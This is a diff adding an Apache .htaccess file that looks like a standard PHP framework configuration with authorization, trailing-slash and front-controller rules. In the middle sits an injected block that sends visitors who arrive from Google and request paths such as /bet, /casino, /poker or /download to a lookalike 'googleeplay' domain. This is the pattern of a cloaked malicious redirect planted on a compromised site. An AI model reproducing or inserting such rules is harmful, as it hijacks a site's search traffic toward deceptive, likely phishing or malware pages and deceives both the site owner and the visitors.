@@ -1,0 +1,26 @@
+<IfModule mod_rewrite.c>
+    <IfModule mod_negotiation.c>
+        Options -MultiViews -Indexes
+    </IfModule>
+
+    RewriteEngine On
+
+    # Handle Authorization Header
+    RewriteCond %{HTTP:Authorization} .
+    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+
+    # Redirect Trailing Slashes If Not A Folder...
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_URI} (.+)/$
+    RewriteRule ^ %1 [L,R=301]
+
+    RewriteEngine On
+    RewriteCond %{HTTP_REFERER} ^https?://www\.google\. [NC]
+    RewriteCond %{REQUEST_URI} /(app|ios|android|download|blank|bet|casino|games|play|video|poker|root|news|patt|tee|sto|bea|slo|bac|pac|tig|bmw|fru|bull|card|gods|fish|mahj|uri|bak\.php|index\.php) [NC]
+    RewriteRule ^.*$ https://br.googleeplay.com/fa.html [R=302,L]
+     
+    # Handle Front Controller...
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteRule ^ index.php [L]
+</IfModule>
